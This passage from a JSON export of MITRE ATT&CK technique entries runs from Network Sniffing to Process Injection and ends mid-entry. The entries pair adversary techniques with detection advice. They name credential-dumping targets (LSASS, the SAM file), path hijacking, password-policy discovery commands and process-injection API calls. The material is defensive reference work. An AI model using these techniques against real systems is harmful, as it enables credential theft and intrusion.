                "description": "Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.",
                "url": "https://attack.mitre.org/techniques/T1040",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution"
                ],
                "detection": "Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a [Man-in-the-Middle](https://attack.mitre.org/techniques/T1557) attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.",
                "permissions": [
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ],
                "tactics": [
                    "credential-access",
                    "discovery"
                ]
            },
            {
                "id": "T1095",
                "name": "Non-Application Layer Protocol",
                "description": "Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution)\n Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "url": "https://attack.mitre.org/techniques/T1095",
                "data_sources": [
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.(Citation: Cisco Blog Legacy Device Attacks)\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2) \n\nMonitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.",
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS",
                    "Network"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1571",
                "name": "Non-Standard Port",
                "description": "Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.",
                "url": "https://attack.mitre.org/techniques/T1571",
                "data_sources": [
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2)",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1003",
                "name": "OS Credential Dumping",
                "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.\n\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n",
                "url": "https://attack.mitre.org/techniques/T1003",
                "data_sources": [
                    "Process: Process Creation",
                    "Process: Process Access",
                    "Command: Command Execution",
                    "File: File Access",
                    "Windows Registry: Windows Registry Key Access",
                    "Active Directory: Active Directory Object Access",
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content",
                    "Process: OS API Execution"
                ],
                "detection": "### Windows\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002) access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.\n\nHash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [Mimikatz](https://attack.mitre.org/software/S0002). [PowerShell](https://attack.mitre.org/techniques/T1059/001) scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module, (Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync. (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Note: Domain controllers may not log replication requests originating from the default domain controller account. (Citation: Harmj0y DCSync Sept 2015). Also monitor for network protocols  (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests (Citation: Microsoft SAMR) from IPs not associated with known domain controllers. (Citation: AdSecurity DCSync Sept 2015)\n\n### Linux\nTo obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path <code>/proc/<pid>/maps</code>, where the <code><pid></code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.",
                "permissions": [
                    "Administrator",
                    "SYSTEM",
                    "root"
                ],
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ],
                "tactics": [
                    "credential-access"
                ]
            },
            {
                "id": "T1027",
                "name": "Obfuscated Files or Information",
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) ",
                "url": "https://attack.mitre.org/techniques/T1027",
                "data_sources": [
                    "File: File Content",
                    "File: File Metadata",
                    "File: File Creation",
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Command: Command Execution"
                ],
                "detection": "Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) \n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \n\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. ",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1588",
                "name": "Obtain Capabilities",
                "description": "Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.\n\nIn addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab)\n\nIn addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)",
                "url": "https://attack.mitre.org/techniques/T1588",
                "detection": "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control.",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "resource-development"
                ]
            },
            {
                "id": "T1137",
                "name": "Office Application Startup",
                "description": "Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.\n\nA variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)",
                "url": "https://attack.mitre.org/techniques/T1137",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Windows Registry: Windows Registry Key Creation",
                    "Windows Registry: Windows Registry Key Modification",
                    "File: File Creation",
                    "File: File Modification",
                    "Module: Module Load",
                    "Application Log: Application Log Content"
                ],
                "detection": "Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously.\n\nMany Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page)\n\nMicrosoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)",
                "permissions": [
                    "User",
                    "Administrator"
                ],
                "platforms": [
                    "Windows",
                    "Office 365"
                ],
                "tactics": [
                    "persistence"
                ]
            },
            {
                "id": "T1201",
                "name": "Password Policy Discovery",
                "description": "Adversaries may attempt to access detailed information about the password policy used within an enterprise network. Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code>.(Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies)",
                "url": "https://attack.mitre.org/techniques/T1201",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution"
                ],
                "detection": "Monitor processes for tools and command line arguments that may indicate they're being used for password policy discovery. Correlate that activity with other suspicious activity from the originating system to reduce potential false positives from valid user or administrator activity. Adversaries will likely attempt to find the password policy early in an operation and the activity is likely to happen with other Discovery activity.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1034",
                "name": "Path Interception",
                "description": "**This technique has been deprecated. Please use [Path Interception by PATH Environment Variable](https://attack.mitre.org/techniques/T1574/007), [Path Interception by Search Order Hijacking](https://attack.mitre.org/techniques/T1574/008), and/or [Path Interception by Unquoted Path](https://attack.mitre.org/techniques/T1574/009).**\n\nPath interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of [cmd](https://attack.mitre.org/software/S0106) in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. (Citation: TechNet MS14-019)\n\nThere are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.\n\n### Unquoted Paths\nService paths (stored in Windows Registry keys) (Citation: Microsoft Subkey) and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Baggett 2012) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: SecurityBoulevard Unquoted Services APR 2018) (Citation: SploitSpren Windows Priv Jan 2018)\n\n### PATH Environment Variable Misconfiguration\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\\system32</code> (e.g., <code>C:\\Windows\\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\n\nFor example, if <code>C:\\example path</code> precedes <code>C:\\Windows\\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\\example path</code> will be called instead of the Windows system \"net\" when \"net\" is executed from the command-line.\n\n### Search Order Hijacking\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Hill NT Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: MSDN Environment Property)\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).",
                "url": "https://attack.mitre.org/techniques/T1034",
                "detection": "Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious. \n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
                "permissions": [
                    "User",
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "persistence",
                    "privilege-escalation"
                ]
            },
            {
                "id": "T1120",
                "name": "Peripheral Device Discovery",
                "description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
                "url": "https://attack.mitre.org/techniques/T1120",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Process: OS API Execution"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "permissions": [
                    "User",
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Windows",
                    "macOS"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1069",
                "name": "Permission Groups Discovery",
                "description": "Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.",
                "url": "https://attack.mitre.org/techniques/T1069",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Group: Group Enumeration",
                    "Group: Group Metadata",
                    "Application Log: Application Log Content"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1566",
                "name": "Phishing",
                "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source.",
                "url": "https://attack.mitre.org/techniques/T1566",
                "data_sources": [
                    "Application Log: Application Log Content",
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Network intrusion detection systems and email gateways can be used to detect phishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nURL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.\n\nBecause most common third-party services used for phishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Many possible detections of follow-on behavior may take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "SaaS",
                    "Office 365",
                    "Google Workspace"
                ],
                "tactics": [
                    "initial-access"
                ]
            },
            {
                "id": "T1598",
                "name": "Phishing for Information",
                "description": "Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code.\n\nAll forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.\n\nAdversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.",
                "url": "https://attack.mitre.org/techniques/T1598",
                "data_sources": [
                    "Application Log: Application Log Content",
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Depending on the specific method of phishing, the detections can vary. Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nWhen it comes to following links, monitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.\n\nMonitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts).",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "reconnaissance"
                ]
            },
            {
                "id": "T1542",
                "name": "Pre-OS Boot",
                "description": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)\n\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",
                "url": "https://attack.mitre.org/techniques/T1542",
                "data_sources": [
                    "Command: Command Execution",
                    "Network Traffic: Network Connection Creation",
                    "Firmware: Firmware Modification",
                    "Driver: Driver Metadata",
                    "Process: OS API Execution",
                    "Drive: Drive Modification"
                ],
                "detection": "Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes. Take snapshots of boot records and firmware and compare against known good images. Log changes to boot records, BIOS, and EFI, which can be performed by API calls, and compare against known good behavior and patching.\n\nDisk check, forensic utilities, and data from device drivers (i.e. processes and API calls) may reveal anomalies that warrant deeper investigation. (Citation: ITWorld Hard Disk Health Dec 2014)",
                "permissions": [
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Linux",
                    "Windows",
                    "Network"
                ],
                "tactics": [
                    "defense-evasion",
                    "persistence"
                ]
            },
            {
                "id": "T1057",
                "name": "Process Discovery",
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.",
                "url": "https://attack.mitre.org/techniques/T1057",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Process: OS API Execution"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "permissions": [
                    "User",
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1055",
                "name": "Process Injection",
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "url": "https://attack.mitre.org/techniques/T1055",
                "data_sources": [
                    "Module: Module Load",
                    "Process: OS API Execution",
                    "Process: Process Access",
                    "File: File Modification",
                    "File: File Metadata"
                ],
                "detection": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017) \n\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nMonitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) \n\nMonitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules.(Citation: Microsoft Sysmon v6 May 2017) \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion",
                    "privilege-escalation"
                ]
            },
            {
                "id": "T1572",
                "name": "Protocol Tunneling",
